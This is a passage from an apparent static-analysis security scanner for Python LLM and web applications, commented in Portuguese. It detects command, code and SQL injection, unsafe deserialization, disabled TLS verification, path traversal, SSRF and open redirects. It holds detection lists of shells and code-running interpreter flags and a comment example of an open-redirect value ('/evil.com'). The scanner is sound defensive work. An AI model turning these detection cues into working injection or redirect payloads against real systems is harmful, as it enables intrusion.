        if tool and _VALIDATOR.match(last) and not _NOT_VALIDATOR.search(last):
            # validate_app_name(app_name), if not is_safe_path(p): raise: dali em diante o valor foi conferido.
            for a in call.args[:2]:
                if isinstance(a, ast.Name) and TOOL in env.get(a.id, ()):
                    env[a.id] = env[a.id] - {TOOL}
                    if not env[a.id]:
                        del env[a.id]

    def local_call(self, call, env):
        """Helper do próprio arquivo chamado com argumento de ferramenta: guarda quais parâmetros dele recebem o valor
        (run_query(args["sql"]), self._read(path), TOOLS[name](**args)). Função importada de outro arquivo do projeto
        (from .db import run_query) fica anotada para a análise daquele arquivo."""
        f = call.func
        targets, method, ext = [], False, None
        if isinstance(f, ast.Name):
            if f.id in self.funcs:
                targets = [self.funcs[f.id]]
            elif f.id in self.ximports:
                ext = self.ximports[f.id]
            else:
                v = self.vals.get(f.id)  # fn = TOOLS[name]; fn(**args)
                if isinstance(v, ast.Subscript) and isinstance(v.value, ast.Name):
                    targets = [self.funcs[n] for n in self.dispatch.get(v.value.id, []) if n in self.funcs]
        elif isinstance(f, ast.Attribute) and isinstance(f.value, ast.Name) and f.value.id in ("self", "cls") and self.cls:
            node = self.methods.get(self.cls, {}).get(f.attr)
            targets, method = ([node] if node else []), True
        elif isinstance(f, ast.Subscript) and isinstance(f.value, ast.Name):
            targets = [self.funcs[n] for n in self.dispatch.get(f.value.id, []) if n in self.funcs]
        if not targets and ext is None:
            return
        pos_hit = [(i, isinstance(a, ast.Starred)) for i, a in enumerate(call.args)
                   if TOOL in self.origins(a.value if isinstance(a, ast.Starred) else a, env) and not self.fixed_argv(a)]
        kw_hit = [k.arg for k in call.keywords if TOOL in self.origins(k.value, env) and not self.fixed_argv(k.value)]
        if not pos_hit and not kw_hit:
            return
        if ext is not None:
            if len(self.xcalls) < 200:
                self.xcalls.append((ext, (tuple(pos_hit), tuple(kw_hit))))
            return
        for node in targets[:20]:
            names = _seed_names(node, (pos_hit, kw_hit), method)
            if names:
                self.seeds.setdefault(node, set()).update(names)

    def fixed_argv(self, a):
        """["docker", "build", caminho]: lista de argumentos com o programa escrito no código. O helper que a recebe roda
        aquele programa; o modelo só escolhe argumentos."""
        v = self.vals.get(a.id, a) if isinstance(a, ast.Name) else a
        prog = _argv_program(v, self.vals) if isinstance(v, (ast.List, ast.Tuple, ast.BinOp)) else None
        return prog is not None and _const_str(prog)

    def command(self, call, d, env, fn, ln):
        shell = d in _PY_SHELL
        if d in _PY_SUBPROCESS:
            sh = _kw(call, "shell")
            shell = sh is not None and not (isinstance(sh, ast.Constant) and not sh.value)
        elif not shell and d not in _PY_EXEC_ARGV:
            return
        cmd = _arg(call, 0, "args", "cmd", "command")
        if cmd is None or _const_str(cmd):
            return
        if not shell and isinstance(cmd, (ast.List, ast.Tuple)) and _interp_c(cmd.elts, self._dot):
            # [sys.executable, "-c", texto], ["node", "-e", texto]: o texto é código, como em exec().
            if not _const_str(cmd.elts[2]):
                self.report_code(cmd.elts[2], "code", _interp_name(cmd.elts, self._dot), env, ln,
                                 python=cmd.elts[1].value == "-c")
            return
        if not shell and isinstance(cmd, (ast.List, ast.Tuple)) and _shell_c(cmd.elts):
            # ["sh", "-c", texto]: o texto vai para o shell do mesmo jeito que com shell=True.
            shell, cmd = True, cmd.elts[2]
            if _const_str(cmd):
                return
        built = _builds_string(cmd) or (isinstance(cmd, ast.Name) and cmd.id in self.strs)
        if shell:
            o = self.origins(cmd, env)
        else:
            # Sem shell, o perigo é o programa vir de fora: ["git", "log", x] é seguro, [x, ...] ou x.split() não.
            prog = _argv_program(self.vals.get(cmd.id, cmd) if isinstance(cmd, ast.Name) else cmd, self.vals)
            if prog is None or isinstance(prog, ast.Starred) or _const_str(prog):
                return
            o, built = self.origins(prog, env), False
        if LLM in o:
            self.out.add("APP009", "critical", ln, _llm_params("shell"))
        elif TOOL in o:
            # Ferramenta feita para rodar o comando que o modelo escolher (alto): é o desenho, mas qualquer injeção vira
            # comando. Com o valor no meio de um comando escrito no código, é injeção de comando (crítico).
            self.out.tool("shell", built, ln)
        elif o & REQ_ANY:
            self.out.add("COD002", "critical", ln, _src(REQ))
        elif PARAM in o and shell and built and self.server:
            self.out.add("COD002", "medium", ln, _src(PARAM))

    def code_exec(self, call, d, last, env, fn, ln):
        if d in ("eval", "exec", "builtins.eval", "builtins.exec") and "eval" not in self.imports and "exec" not in self.imports:
            kind, sink = "code", d.rsplit(".", 1)[-1] + "()"
        elif last == "render_template_string" or d in ("jinja2.Template", "jinja2.environment.Template") or \
                (last == "from_string" and any(m.startswith("jinja2") for m in self.imports.values())):
            kind, sink = "template", "template"
        else:
            return
        code = _arg(call, 0, "source")
        if code is None or _const_str(code):
            return
        self.report_code(code, kind, sink, env, ln, python=kind == "code")

    def report_code(self, code, kind, sink, env, ln, python=False):
        """python: o texto é código Python, onde {v!r} e repr(v) viram um literal (um template não respeita isso)."""
        o = set()
        for n in self.code_parts(code) if python else [code]:
            o |= self.origins(n, env)
        built = _builds_string(code) or (isinstance(code, ast.Name) and code.id in self.strs)
        if LLM in o:
            self.out.add("APP009", "critical", ln, _llm_params(kind))
        elif TOOL in o:
            self.out.tool(kind, built, ln)
        elif o & REQ_ANY:
            self.out.add("COD003", "critical", ln, dict(_src(REQ), sink=sink))
        elif PARAM in o and kind == "code" and self.server and built:
            self.out.add("COD003", "medium", ln, dict(_src(PARAM), sink=sink))

    def code_parts(self, code):
        """As partes de um código Python montado que podem mudar o código: {v!r} e repr(v) escrevem o valor como literal."""
        out, todo, seen = [], [code], 0
        while todo and seen < _PIECES:
            n = todo.pop()
            seen += 1
            if isinstance(n, ast.JoinedStr):
                todo += [v.value for v in n.values if isinstance(v, ast.FormattedValue) and v.conversion != ord("r")]
            elif isinstance(n, ast.BinOp) and isinstance(n.op, ast.Add):
                todo += [n.left, n.right]
            elif isinstance(n, ast.Name) and n.id in self.strs and seen == 1:
                todo += self.strs[n.id]
            elif not (isinstance(n, ast.Call) and self._dot(n.func) == "repr" or _const_str(n)):
                out.append(n)
        return out + todo

    def whole_query(self, q, env):
        """A consulta inteira vem de fora (texto do modelo ou da requisição), não de um construtor como select(...)."""
        v = q
        if isinstance(q, ast.Name):
            v = self.vals.get(q.id, q)
        if isinstance(v, ast.Await):
            v = v.value
        if isinstance(v, ast.Call):
            d = self._dot(v.func)
            last = d.rsplit(".", 1)[-1] if d else (v.func.attr if isinstance(v.func, ast.Attribute) else "")
            if last in _SQL_BUILDERS:
                return set()
        elif not isinstance(v, (ast.Name, ast.Attribute, ast.Subscript)):
            return set()
        return self.origins(q, env)

    def sql(self, call, d, last, env, ln):
        if last == "extra" and isinstance(call.func, ast.Attribute) and any(k.arg in _DJ_EXTRA for k in call.keywords):
            self.extra_sql(call, env, ln)
            return
        text_call = d in ("sqlalchemy.text", "sqlalchemy.sql.text", "sqlalchemy.sql.expression.text", "sqlmodel.text")
        # db._execute_query(f"... {x}"): helper do próprio código que recebe o SQL pronto; só vale com SQL montado.
        low = last.lower()
        helper = not text_call and ("query" in low or "sql" in low or "statement" in low) and bool(_SQL_HELPER.match(last))
        if not text_call and not helper:
            if last not in _PY_SQL_METHODS or not isinstance(call.func, ast.Attribute):
                return
            if last in ("fetch", "query", "sql") and not _PY_SQL_RECEIVER.search(_receiver(call)):
                return
        q = _arg(call, 0, "sql", "query", "statement", "operation")
        if q is None or _const_str(q):
            return
        v = self.sql_verdict(q, env)
        if helper:
            if v is None or v[1] == PARAM:
                return
        elif v is None and (text_call or _PY_SQL_RECEIVER.search(_receiver(call))):
            # SQL escrito pelo modelo (text-to-SQL) ou mandado na requisição. Argumento de ferramenta que é a consulta
            # inteira é uma ferramenta de SQL por desenho: o risco está nas permissões do banco, não neste código.
            o = self.whole_query(q, env)
            v = ("high", LLM) if LLM in o else ("high", REQ) if o & REQ_ANY else None
        self.report_sql(v, ln)

    def extra_sql(self, call, env, ln):
        """QuerySet.extra(where=[...], select={...}, tables=[...]) do Django: cada pedaço vai cru para o SQL, como no
        RawSQL. Só o valor de fora no meio do pedaço (ou o pedaço inteiro) conta; %s com params=[...] é parâmetro."""
        best = None
        for k in call.keywords:
            if k.arg not in _DJ_EXTRA:
                continue
            v = k.value
            items = v.values if isinstance(v, ast.Dict) else v.elts if isinstance(v, (ast.List, ast.Tuple)) else [v]
            for it in items:
                r = None if it is None or _const_str(it) else self.sql_verdict(it, env, need_sql=False)
                if r:
                    best = _sql_best(best, r)
        self.report_sql(best, ln)

    def report_sql(self, v, ln):
        if v is None:
            return
        sev, origin = v
        if origin == LLM:
            self.out.add("APP009", sev, ln, _llm_params("sql"))
        elif origin == TOOL:
            self.out.tool("sql", True, ln, sev)
        else:
            self.out.add("COD001", sev, ln, _src(origin))

    def safe_loaders(self):
        """Classes do próprio arquivo que herdam só de loaders seguros (class StrictLoader(yaml.SafeLoader), também em
        mais de um passo): o yaml.load com elas é seguro como com o SafeLoader."""
        if self._safe_loaders is None:
            classes = [n for n in _walk(self.tree) if isinstance(n, ast.ClassDef)]
            safe = set()
            for _ in range(4):
                more = set()
                for c in classes:
                    bases = [self._dot(b) for b in c.bases]
                    loaders = [b for b in bases if b.endswith("Loader")]
                    if c.name not in safe and loaders and \
                            all(b.endswith(_SAFE_LOADERS) or b.rsplit(".", 1)[-1] in safe for b in loaders):
                        more.add(c.name)
                if not more:
                    break
                safe |= more
            self._safe_loaders = safe
        return self._safe_loaders

    def deserialize(self, call, d, env, ln):
        if d in ("yaml.load", "yaml.load_all", "yaml.unsafe_load", "yaml.unsafe_load_all"):
            if not self.imported(call.func):
                return  # yaml = YAML() do ruamel, ou outro objeto com load()
            loader = _kw(call, "Loader") if _kw(call, "Loader") is not None else (call.args[1] if len(call.args) > 1 else None)
            ld = self._dot(loader) if loader is not None else ""
            if "unsafe" not in d and loader is not None and not ld.endswith(("Loader", "UnsafeLoader")):
                return  # SafeLoader, CSafeLoader, BaseLoader, FullLoader
            if ld.endswith(_SAFE_LOADERS) or ld.rsplit(".", 1)[-1] in self.safe_loaders():
                return
            data = _arg(call, 0, "stream")
            o = self.origins(data, env) if data is not None else set()
            if TOOL in o and not o & (REQ_ANY | {LLM}):
                self.out.tool("deserialize", True, ln)
                return
            explicit = "unsafe" in d or loader is not None
            sev = "high" if o & (REQ_ANY | {LLM}) else "medium" if explicit or NET in o else "low"
            self.out.add("COD004", sev, ln, {"what": "yaml." + d.split(".", 1)[1] + ("" if loader is None else f"(Loader={ld.rsplit('.', 1)[-1]})")})
        elif d in _PY_UNPICKLE:
            if d == "numpy.load" and not _is_true(_kw(call, "allow_pickle")):
                return
            data = _arg(call, 0, "data", "file", "filename")
            o = self.origins(data, env) if data is not None else set()
            if TOOL in o and not o & (REQ_ANY | {LLM}):
                self.out.tool("deserialize", True, ln)
            elif o & (REQ_ANY | {LLM}):
                self.out.add("COD004", "high", ln, {"what": d})
            elif NET in o:
                self.out.add("COD004", "medium", ln, {"what": d})

    def tls(self, call, d, last, ln):
        if d == "ssl._create_unverified_context":
            self.out.add("COD006", "medium", ln, {"what": "ssl._create_unverified_context()"})
            return
        http = d.startswith(("requests.", "httpx.", "aiohttp.", "urllib3.", "boto3.", "urllib.")) or last in _PY_HTTP
        for k in call.keywords:
            if k.arg in ("verify", "verify_ssl", "ssl") and _is_false(k.value) and http and "jwt" not in d:
                self.out.add("COD006", "medium", ln, {"what": f"{k.arg}=False"})
            elif k.arg == "verify_certs" and _is_false(k.value):
                self.out.add("COD006", "medium", ln, {"what": "verify_certs=False"})
            elif k.arg in ("cert_reqs", "ssl_cert_reqs") and (self._dot(k.value).endswith("CERT_NONE") or
                                                              (_const_str(k.value) and k.value.value.upper() in ("CERT_NONE", "NONE"))):
                self.out.add("COD006", "medium", ln, {"what": f"{k.arg}=CERT_NONE"})

    def files(self, call, d, last, env, fn, ln):
        target = None
        if d in _PY_FILE_SINKS or (last == "open" and d.startswith(("aiofiles", "io.", "codecs."))):
            target = _arg(call, 0, "file", "path", "filename", "name")
        elif isinstance(call.func, ast.Attribute) and call.func.attr in _PATH_METHODS:
            target = call.func.value
            if not (self.is_path(target) or (isinstance(target, ast.Name) and self.is_path(self.vals.get(target.id)))):
                return
        if target is None or _const_str(target) or fn.guard_path or fn.admin:
            return
        o = self.origins(target, env, path=self.has_ext)
        if REQ in o:
            self.out.add("COD007", "high", ln, {"sink": (d or last) + "()"})
        elif TOOL in o:
            built, fixed = self.path_shape(target, env)
            if not fixed:
                self.out.tool("path", built, ln)

    def path_shape(self, node, env):
        """(montado, nome_fixo). Montado: o caminho junta o valor a uma pasta escrita no código (os.path.join(BASE, nome),
        BASE / nome, f"{BASE}/{nome}"): a ferramenta pretendia ficar naquela pasta, e ../ sai dela. Nome fixo: o modelo
        só escolhe a pasta e o código escreve o nome do arquivo (os.path.join(pasta, "modelo.json"))."""
        v = self.vals.get(node.id, node) if isinstance(node, ast.Name) else node
        for _ in range(3):
            if isinstance(v, ast.Call) and isinstance(v.func, ast.Attribute) and v.func.attr in _PATH_METHODS | {
                    "resolve", "expanduser", "absolute"} and not v.args:
                v = v.func.value  # Path(x).resolve(), (BASE / x).open()
            elif isinstance(v, ast.Name) and v.id in self.vals and v is not node:
                v = self.vals[v.id]
            else:
                break
        parts, tail = [], None
        if isinstance(v, ast.Call) and self._dot(v.func).endswith(("join", "Path", "PurePath", "joinpath")):
            parts = ([v.func.value] if self._dot(v.func).endswith("joinpath") else []) + list(v.args)
            tail = parts[-1:] if len(parts) > 1 else None
        elif isinstance(v, ast.BinOp) and isinstance(v.op, ast.Div):
            parts, tail = [v.left, v.right], [v.right]
        elif isinstance(v, (ast.BinOp, ast.JoinedStr)) or isinstance(v, ast.Name) and v.id in self.strs:
            pieces = [p for p in self.pieces(v, env) if not (p[0] == "lit" and not p[1])]
            parts = [p[1] for p in pieces]
            cut = [i for i, p in enumerate(pieces) if p[0] == "lit" and re.search(r"[/\\]", p[1])]
            if cut and cut[-1] > 0:
                tail = [p[1] for p in pieces[cut[-1] + 1:] if p[0] == "expr"]
        fixed = tail is not None and not any(TOOL in self.origins(x, env) for x in tail if x is not None and
                                             not isinstance(x, str))
        # Montado só quando a pasta do começo é do código: com os.path.join(dir_do_modelo, nome), o caminho todo já é do
        # modelo (médio, como open(caminho)).
        first = parts[0] if parts else None
        built = len(parts) > 1 and (isinstance(first, str) or first is None or TOOL not in self.origins(first, env))
        return built, fixed

    def is_path(self, v):
        if isinstance(v, ast.BinOp) and isinstance(v.op, ast.Div):
            return True
        return isinstance(v, ast.Call) and self._dot(v.func).endswith(("Path", "PurePath", "os.path.join", "joinpath"))

    def lead_origins(self, node, env, host=False, slash=False):
        """Origens do começo do endereço (esquema e host), não de um pedaço do caminho. host: o host escrito depois de um
        "https://" fixo também conta (para buscar no servidor; num redirect para https://{Host}/ ninguém de fora manda o
        cabeçalho Host pelo navegador de outra pessoa). slash: só barras na frente ("/" + next) não prendem o redirect no
        site, porque next = "/evil.com" vira //evil.com."""
        part = self.lead_part(node, env, 0, host, slash)
        return set() if part is None else self.origins(part, env)

    def lead_part(self, node, env, depth, host, slash):
        """O valor que decide o começo do endereço (o host em f"https://{host}/x"), ou None quando o começo é fixo."""
        if isinstance(node, ast.BoolOp):
            return self.lead_part(node.values[0], env, depth, host, slash)
        v = self.vals.get(node.id) if isinstance(node, ast.Name) and node.id not in self.strs else None
        if depth < 3 and isinstance(v, ast.BinOp) and isinstance(v.op, ast.Add):
            # full = BASE + caminho; requests.get(full): o começo é o do valor declarado.
            return self.lead_part(v, env, depth + 1, host, slash)
        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add) and not _builds_string(node):
            while isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
                node = node.left  # BASE + caminho: o começo é o da esquerda
            return self.lead_part(node, env, depth + 1, host, slash)
        if isinstance(node, ast.Name) and node.id in self.strs:
            parts = self.pieces(node, env)
        elif _builds_string(node):
            parts = self.pieces(node, env)
        else:
            return node
        parts = [p for p in parts if not (p[0] == "lit" and p[1] == "")]
        if host and len(parts) > 1 and parts[0][0] == "lit" and _IN_HOST.match(parts[0][1]):
            parts = parts[1:]  # f"https://{host}/x": o texto fixo para onde o host começa
        if slash and len(parts) > 1 and parts[0][0] == "lit" and _ONLY_SLASHES.match(parts[0][1]):
            parts = parts[1:]
        if parts and parts[0][0] == "expr":
            return parts[0][1]
        return None

    def host_header(self, node, depth=0):
        """O valor é o cabeçalho Host (ou X-Forwarded-Host) da requisição: request.headers["Host"],
        request.headers.get("x-forwarded-host") or ..., também guardado numa variável antes."""
        if isinstance(node, ast.BoolOp):
            return self.host_header(node.values[0], depth)
        if isinstance(node, ast.Name) and depth < 3 and node.id in self.vals and node.id not in self.strs:
            return self.host_header(self.vals[node.id], depth + 1)
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute) and node.func.attr == "get" and node.args:
            box, key = node.func.value, node.args[0]
        elif isinstance(node, ast.Subscript):
            box, key = node.value, node.slice
        else:
            return False
        return isinstance(box, ast.Attribute) and box.attr == "headers" and _const_str(key) and \
            key.value.lower() in _HOST_HEADERS

    def start_controlled(self, node, env):
        """A requisição decide o começo do endereço (esquema e host), não só um pedaço do caminho. Vale também o host
        depois de um "https://" fixo ("https://" + request.args["host"]), menos o cabeçalho Host ou X-Forwarded-Host:
        esse é o host do próprio site, que o navegador de outra pessoa não escolhe."""
        if REQ in self.lead_origins(node, env, slash=True):
            return True
        part = self.lead_part(node, env, 0, True, True)
        return part is not None and REQ in self.origins(part, env) and not self.host_header(part)

    def urls(self, call, d, last, env, fn, ln):
        f = call.func
        http = (d.startswith(("requests.", "httpx.")) and last in _PY_HTTP and last not in ("Client", "AsyncClient", "Session")) or \
            d in ("urllib.request.urlopen", "urllib.request.Request", "urlopen", "requests.request") or \
            (isinstance(f, ast.Attribute) and isinstance(f.value, ast.Name) and f.value.id in self.clients and last in _PY_HTTP)
        if http:
            url = _arg(call, 1 if last == "request" else 0, "url")
            if url is not None and not _const_str(url) and not fn.guard_url and not fn.admin:
                part = self.lead_part(url, env, 0, True, False)
                o = set() if part is None else self.origins(part, env)
                if REQ in o:
                    # Host tirado do cabeçalho Host: o navegador de outra pessoa não escolhe e o proxy costuma conferir.
                    sev = "medium" if self.host_header(part) else "high"
                    self.out.add("COD008", sev, ln, {"sink": d + "()"})
                elif TOOL in o:
                    self.out.tool("url", False, ln)
            return
        if last in _PY_REDIRECT and (d.endswith(("flask.redirect", "shortcuts.redirect", "werkzeug.utils.redirect")) or last != "redirect"
                                     or self.server):
            url = _arg(call, 0, "url", "location", "redirect_to", "to")
            if url is not None and not _const_str(url) and not fn.guard_redirect and self.start_controlled(url, env):
                self.out.add("COD009", "medium", ln, {"sink": last + "()"})

    def html(self, call, d, last, env, ln):
        if last in _PY_HTML and (last in ("Markup", "mark_safe", "SafeString", "HTMLResponse") or self.server):
            v = _arg(call, 0, "content", "body", "response")
            if v is None or _const_str(v):
                return
            o = self.origins(v, env)
            if LLM in o and last in ("Markup", "mark_safe", "SafeString", "HTMLResponse"):
                self.out.add("APP009", "medium", ln, _llm_params("html"))
            elif o & REQ_ANY and (last in ("Markup", "mark_safe", "SafeString") or _builds_string(v)):
                parts = self.pieces(v, env)
                lit = "".join(p for k, p in parts if k == "lit")
                if last in ("Markup", "mark_safe", "SafeString") or re.search(r"<[a-zA-Z]", lit):
                    self.out.add("COD005", "medium", ln, {"sink": last + "()"})
        if _is_true(_kw(call, "unsafe_allow_html")) or (d.startswith("streamlit.") and last == "html"):
            v = _arg(call, 0, "body")
            if v is not None and LLM in self.origins(v, env):
                self.out.add("APP009", "medium", ln, _llm_params("html"))

    def models(self, call, d, last, env, ln):
        for k in call.keywords:
            if k.arg == "trust_remote_code" and _is_true(k.value):
                self.out.add("APP012", "medium", ln, _model_params("trust_remote_code"))
            elif k.arg == "allow_dangerous_deserialization" and _is_true(k.value):
                self.out.add("APP012", "medium", ln, _model_params("allow_dangerous_deserialization"))
            elif k.arg == "allow_dangerous_code" and _is_true(k.value):
                self.out.add("APP013", "high", ln, _agent_params("allow_dangerous_code"))
            elif k.arg == "allow_dangerous_requests" and _is_true(k.value):
                self.out.add("APP013", "medium", ln, _agent_params("allow_dangerous_requests"))
        if d == "torch.load":
            wo = _kw(call, "weights_only")
            data = _arg(call, 0, "f")
            tainted = data is not None and self.origins(data, env) & (REQ_ANY | {NET})
            if tainted and not _is_true(wo):
                self.out.add("APP012", "high", ln, _model_params("torch.load"))
            elif _is_false(wo):
                self.out.add("APP012", "medium", ln, _model_params("torch.load"))
            elif wo is None:
                self.out.add("APP012", "low", ln, _model_params("torch.load"))
        framework = d.startswith(("langchain", "llama_index", "autogen", "langchain_experimental", "langchain_community"))
        if last in _AGENT_EXEC_TOOLS and framework:
            self.out.add("APP013", "high", ln, _agent_params(_AGENT_EXEC_TOOLS[last]))
        elif last in _AGENT_SQL_TOOLS and framework:
            self.out.add("APP013", "medium", ln, _agent_params("sql"))
        elif last == "load_tools" and framework:
            names = {c.value for c in _walk(call) if _const_str(c)}
            if names & {"python_repl", "terminal", "shell", "bash"}:
                self.out.add("APP013", "high", ln, _agent_params("load_tools"))

    def prompt(self, call, d, env, ln):
        llm = self.is_llm_call(call, cost=True) or d.endswith(("GenerativeModel", "GenerateContentConfig", "Agent",
                                                                "create_react_agent", "ChatPromptTemplate.from_messages"))
        for k in call.keywords:
            if k.arg in ("system", "system_instruction", "system_prompt", "instructions") and llm and self.system_text(k.value, env):
                self.out.add("APP010", "medium", ln)
        if d.endswith(("SystemMessage", "SystemMessagePromptTemplate.from_template")):
            if self.system_text(_arg(call, 0, "content", "template"), env):
                self.out.add("APP010", "medium", ln)

    def hashing(self, call, d, last, ln):
        algo = _PY_HASH.get(d)
        args = call.args
        if d == "hashlib.new" and args and _const_str(args[0]):
            algo, args = args[0].value.upper(), args[1:]
        elif algo is None and last == "update" and isinstance(call.func, ast.Attribute) and \
                isinstance(call.func.value, ast.Name) and call.func.value.id in self.hashers:
            algo = self.hashers[call.func.value.id]
        if algo and any(password_name(n) for a in args for n in _names_in(a)):
            self.out.add("COD011", "medium", ln, {"algo": algo})

    # ------------------------------------------------------------------ APP011

    def unbounded(self):
        if not self.llm_sdk:
            return
        mod = self.module_text()
        if _PY_AUTH.search(mod) or _PY_LIMIT.search(mod):
            return
        for node, decos in self.routes:
            body = self.seg(node)
            calls_llm = any(isinstance(c, ast.Call) and (self.is_llm_call(c, cost=True) or
                                                          (isinstance(c.func, ast.Name) and c.func.id in self.llm_funcs))
                            for c in _walk(node))
            if not calls_llm or _PY_AUTH.search(body) or _PY_LIMIT.search(body):
                continue
            if any(re.search(r"(?i)login|auth|permission|requires|limit|jwt|token|protected|admin", x) for x in decos if x):
                continue
            self.out.add("APP011", "medium", node.lineno)
            return

    def module_text(self):
        """Código fora das funções (FastAPI(dependencies=...), Limiter(...)) e middlewares."""
        keep = []
        for st in self.tree.body:
            if isinstance(st, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
                decos = "\n".join(self.seg(d) for d in st.decorator_list)
                keep.append(decos + ("\n" + self.seg(st) if "middleware" in decos else ""))
            else:
                keep.append(self.seg(st))
        return "\n".join(keep)


_PY_AUTH = re.compile(r"(?i)\bDepends\(\s*\w*(?:user|auth|token|verify|api_?key|current|session|permission|security|admin|"
                      r"login|limit|rate|jwt|bearer|key)\w*|\bSecurity\(|login_required|jwt_required|permission_classes|"
                      r"request\.user|current_user|get_current|verify_token|verify_api_key|authorization|HTTPBearer|"
                      r"OAuth2PasswordBearer|APIKeyHeader|status_code\s*=\s*40[13]|HTTP_40[13]|abort\(\s*40[13]|"
                      r"\bauthenticate|is_authenticated|requires_auth|auth_required|token_required|x-api-key|api_key_header|"
                      r"firebase_admin|verify_id_token|clerk|supabase\.auth|@requires|dependencies\s*=")
_PY_LIMIT = re.compile(r"(?i)rate.?limit|limiter|slowapi|throttl|ratelimit|quota|RateLimiter")


def _lit_before(parts, i, keep=200):
    """O texto fixo antes da parte i, só o fim (o que _VALUE_POS olha): juntar tudo a cada parte é quadrático."""
    out, size, j = [], 0, i - 1
    while j >= 0 and size < keep:
        if parts[j][0] == "lit":
            out.append(parts[j][1])
            size += len(parts[j][1])
        j -= 1
    return "".join(reversed(out))[-keep:]


# Conferências de texto que deixam só dígitos ou letras: depois de "if not x.isdigit(): return", x não muda o SQL.
_STR_CHECKS = {"isdigit", "isnumeric", "isdecimal", "isalnum", "isalpha", "isidentifier"}


def _anchored(pattern, start=True):
    """O padrão confere o texto inteiro: termina em $ ou \\Z e, com start, começa em ^ ou \\A."""
    if not pattern or not re.search(r"(?:(?<!\\)\$|\\Z)\Z", pattern):
        return False
    return not start or pattern.startswith(("^", "\\A"))


def _exits(body):
    """O bloco sai da função ou do laço: return, raise, continue, break, abort(400), sys.exit()."""
    last = body[-1] if body else None
    if isinstance(last, (ast.Return, ast.Raise, ast.Continue, ast.Break)):
        return True
    if isinstance(last, ast.Expr) and isinstance(last.value, ast.Call):
        f = last.value.func
        name = f.attr if isinstance(f, ast.Attribute) else f.id if isinstance(f, ast.Name) else ""
        return name in ("abort", "exit", "_exit")
    return False


def _guard_key(node):
    """A chave do ambiente para o valor conferido: x, ou body.sort (como _attr_key)."""
    if isinstance(node, ast.Name):
        return node.id
    if isinstance(node, ast.Attribute):
        return _attr_key(node)
    return None


def _attr_key(node):
    parts = []
    while isinstance(node, ast.Attribute):
        parts.append(node.attr)
        node = node.value
    if isinstance(node, ast.Name) and node.id in ("self", "cls"):
        return ".".join([node.id] + parts[::-1])
    return None


def _bind(target, origins, env):
    if isinstance(target, ast.Name):
        env[target.id] = set(origins)
    elif isinstance(target, (ast.Tuple, ast.List)):
        for e in target.elts:
            _bind(e.value if isinstance(e, ast.Starred) else e, origins, env)
    elif isinstance(target, ast.Attribute):
        key = _attr_key(target)
        if key:
            env[key] = set(origins)
    elif isinstance(target, ast.Subscript):
        base = target.value
        while isinstance(base, ast.Subscript):
            base = base.value
        if isinstance(base, ast.Name) and origins:
            env[base.id] = env.get(base.id, set()) | set(origins)


_SHELLS = {"sh", "bash", "zsh", "dash", "ksh", "fish", "cmd", "cmd.exe", "powershell", "powershell.exe", "pwsh"}
_SHELL_FLAGS = {"-c", "-lc", "-ic", "-ec", "-xc", "/c", "/C", "-Command", "-command", "-NoProfile -Command"}


# Interpretador que roda o texto da opção como código: python -c, node -e, ruby -e, php -r.
_INTERP = [(re.compile(r"(?:python[\d.]*w?|py|pypy3?)(?:\.exe)?"), {"-c"}),
           (re.compile(r"(?:node|nodejs|bun)(?:\.exe)?"), {"-e", "--eval", "-p", "--print"}),
           (re.compile(r"(?:ruby|perl|rscript)(?:\.exe)?"), {"-e"}), (re.compile(r"php(?:\.exe)?"), {"-r"})]
_INTERP_SELF = {"sys.executable": "-c", "process.execPath": "-e"}


def _interp_flag(prog, flag):
    """prog: o programa sem pasta ("python3", "node") ou o executável atual (sys.executable, process.execPath)."""
    if prog in _INTERP_SELF:
        return flag == _INTERP_SELF[prog] or prog == "process.execPath" and flag in ("--eval", "-p", "--print")
    name = prog.replace("\\", "/").rsplit("/", 1)[-1].lower()
    return any(rx.fullmatch(name) and flag in flags for rx, flags in _INTERP)


def _interp_name(elts, dot):
    prog = elts[0].value if _const_str(elts[0]) else dot(elts[0])
    return prog.replace("\\", "/").rsplit("/", 1)[-1] + " " + elts[1].value


def _interp_c(elts, dot):
    """[sys.executable, "-c", texto], ["node", "-e", texto]: o terceiro item é código que o interpretador roda."""
    if len(elts) < 3 or not _const_str(elts[1]) or isinstance(elts[2], ast.Starred):
        return False
    prog = elts[0].value if _const_str(elts[0]) else dot(elts[0])
    return bool(prog) and _interp_flag(prog, elts[1].value)


def _shell_c(elts):
    """["sh", "-c", texto], ["bash", "-lc", texto], ["cmd", "/c", texto]: o terceiro item vai inteiro para o shell."""
    if len(elts) < 3 or not (_const_str(elts[0]) and _const_str(elts[1])):
        return False
    prog = elts[0].value.replace("\\", "/").rsplit("/", 1)[-1].lower()
    return prog in _SHELLS and elts[1].value in _SHELL_FLAGS


def _builds_string(node):
    if isinstance(node, ast.JoinedStr):
        return any(isinstance(v, ast.FormattedValue) for v in node.values)
    if isinstance(node, ast.BinOp) and isinstance(node.op, (ast.Add, ast.Mod)):
        return any(_const_str(n) or isinstance(n, ast.JoinedStr) for n in _walk(node))
    if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute) and node.func.attr == "format":
        return _const_str(node.func.value)
    return _const_str(node)


# %s, %(nome)s, %-05.2f: a largura começa com 1-9 (o 0 é flag), para flags e largura não disputarem os mesmos zeros,
# e o nome tem teto (milhares de "%(" sem ")" liam cada um o resto do texto).
_PERCENT = re.compile(r"%(?:\(([^)]{0,100})\))?[-#0 +]*(?:[1-9]\d*)?(?:\.\d+)?([sdifrxXeEgGcab%])")


def _percent_pieces(fmt, right):
    vals = right.elts if isinstance(right, ast.Tuple) else None
    names = right if isinstance(right, ast.Dict) else None
    out, i = [], 0
    pos = 0
    for m in _PERCENT.finditer(fmt):
        out.append(("lit", fmt[pos:m.start()]))
        pos = m.end()
        if m.group(2) == "%":
            out.append(("lit", "%"))
            continue
        if names is not None and m.group(1) is not None:
            v = next((v for k, v in zip(names.keys, names.values) if _const_str(k) and k.value == m.group(1)), names)
        elif vals is not None:
            v = vals[i] if i < len(vals) else right
            i += 1
        else:
            v = right
        out.append(("expr", v))
    out.append(("lit", fmt[pos:]))
    return out


def _format_pieces(fmt, call):
    out, i = [], 0
    kws = {k.arg: k.value for k in call.keywords if k.arg}
    try:
        parsed = list(string.Formatter().parse(fmt))
    except ValueError:
        return [("lit", fmt), ("expr", call)]
    for lit, field, _, _ in parsed:
        out.append(("lit", lit))
        if field is None:
            continue
